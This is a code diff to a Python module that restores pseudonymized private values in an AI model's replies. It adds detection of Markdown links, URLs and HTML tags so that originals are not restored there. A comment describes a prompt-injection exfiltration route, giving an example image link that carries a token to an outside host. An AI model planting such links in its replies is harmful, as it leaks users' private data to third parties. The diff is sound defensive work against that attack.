@@ -51,6 +51,25 @@ def _boundary_ok(text: str, start: int, end: int, pseudonym: str) -> bool:
     return True
 
 
+# Machine-interpreted contexts in a reply: a renderer fetches or follows these,
+# so an original restored there would reach a third party (a prompt-injected
+# reply can plant ![](https://x/?q=TOKEN)). Matches inside them stay
+# unrestored; callers already treat a leftover pseudonym as an incomplete
+# restore and withhold the text.
+_MACHINE_CONTEXTS = (
+    re.compile(r"\]\(\s*<?([^)\s>]+)"),  # Markdown inline link or image target
+    re.compile(r"^[ \t]*\[[^\]\r\n]+\]:[ \t]*(\S+)", re.MULTILINE),  # reference definition
+    re.compile(
+        r"((?:[A-Za-z][A-Za-z0-9+.-]*://|www\.|(?:mailto|tel|data|javascript):)[^\s<>\"']+)"
+    ),  # URL, autolink or scheme reference
+    re.compile(r"(<[A-Za-z][^<>]*>)"),  # HTML/XML tag, attributes included
+)
+
+
+def _machine_context_spans(text: str) -> list[tuple[int, int]]:
+    return [m.span(1) for pattern in _MACHINE_CONTEXTS for m in pattern.finditer(text)]
+
+
 # Foreign-token detector (spec 2026-07-27): bracket-shaped tokens in the raw
 # model reply that we never sent. A translated or stale token remains a weak
 # unused-pseudonym signal while nothing else classifies the bracket value left
@@ -119,7 +138,7 @@ def _pre_reverse_validate(ai_response: AIResponse, vault: SessionVault) -> None:
 def _do_reverse(
     text: str,
     vault: SessionVault,
-) -> tuple[str, list[str], tuple[tuple[int, int], ...]]:
+) -> tuple[str, list[str], tuple[tuple[int, int], ...], int]:
     """Replace pseudonyms with originals.
 
     Algorithm:
@@ -129,7 +148,8 @@ def _do_reverse(
        longer one; claimed ranges never overlap (same rule as
        leak_guard.pseudonym_ranges).
     3. Build the restored text left-to-right and record each inserted interval.
-    4. Return restored text, distinct replaced pseudonyms, and inserted ranges.
+    4. Return restored text, distinct replaced pseudonyms, inserted ranges, and
+       how many occurrences stayed unrestored inside a machine context.
 
     Positional reconstruction (not a progressive str.replace) is what keeps a
     short pseudonym from corrupting an original already spliced in — a
@@ -143,7 +163,8 @@ def _do_reverse(
         vault: The session vault with reverse index
 
     Returns:
-        Restored text, replaced pseudonyms, and restored-output ranges.
+        Restored text, replaced pseudonyms, restored-output ranges, and the
+        machine-context occurrence count.
     """
     # Build pseudonym → original map
     pseudo_to_original: dict[str, str] = {}
@@ -157,6 +178,12 @@ def _do_reverse(
     def _taken(start: int, end: int) -> bool:
         return any(start < ce and end > cs for cs, ce, _ in claimed)
 
+    machine_spans = _machine_context_spans(text)
+    machine_context_count = 0
+
+    def _in_machine_context(start: int, end: int) -> bool:
+        return any(start < me and end > ms for ms, me in machine_spans)
+
     replaced: list[str] = []
     for pseudonym in sorted(pseudo_to_original, key=len, reverse=True):
         if not pseudonym:
@@ -166,8 +193,11 @@ def _do_reverse(
         while (i := text.find(pseudonym, pos)) >= 0:
             j = i + len(pseudonym)
             if not _taken(i, j) and _boundary_ok(text, i, j, pseudonym):
-                claimed.append((i, j, pseudonym))
-                found = True
+                if _in_machine_context(i, j):
+                    machine_context_count += 1
+                else:
+                    claimed.append((i, j, pseudonym))
+                    found = True
             pos = i + 1
         if found:
             replaced.append(pseudonym)
@@ -189,7 +219,7 @@ def _do_reverse(
     parts.append(text[source_cursor:])
     restored = "".join(parts)
 
-    return restored, replaced, tuple(restored_ranges)
+    return restored, replaced, tuple(restored_ranges), machine_context_count
 
 
 def _post_reverse_validate(
@@ -288,7 +318,9 @@ def reverse_map(
     )
 
     # Core reverse
-    restored_text, replaced, restored_ranges = _do_reverse(ai_response.text, vault)
+    restored_text, replaced, restored_ranges, machine_context_count = _do_reverse(
+        ai_response.text, vault
+    )
 
     # Post-validate
     flags, audit_summary = _post_reverse_validate(restored_text, replaced, entity_registry, vault)
@@ -296,6 +328,9 @@ def reverse_map(
     if foreign_count:
         flags.append(f"foreign_tokens:{foreign_count}")
     audit_summary["foreign_token_count"] = foreign_count
+    if machine_context_count:
+        flags.append(f"machine_context:{machine_context_count}")
+    audit_summary["machine_context_count"] = machine_context_count
 
     return ReverseResult(
         text=restored_text,
